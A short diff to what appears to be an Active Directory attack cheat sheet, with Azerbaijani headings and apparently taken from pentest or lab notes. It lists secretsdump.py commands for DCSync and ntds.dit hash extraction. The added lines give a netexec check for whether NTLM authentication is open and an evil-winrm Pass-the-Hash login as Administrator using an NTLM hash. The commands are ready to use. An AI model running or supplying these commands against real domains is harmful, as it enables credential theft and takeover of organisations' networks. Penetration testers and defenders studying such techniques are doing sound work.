@@ -103,7 +103,11 @@ DCSync (NTDS olmadan NTDS nəticəsi)
 secretsdump.py -just-dc-user krbtgt company.local/admin@DC-IP
 python3 secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
 
-Pass The Hash
+Pass The Hash ( Only NTLM status open )
+Chech NTLM status: netexec smb 10.10.10.5 -u test -p test 
+STATUS_NOT_SUPPORTED ( Close ) 
+STATUS_LOGON_FAILURE ( Open )
+
 evil-winrm -i 10.129.201.57 -u Administrator -H 64f12cddaa88057e06a81b54e73b949b
 
 
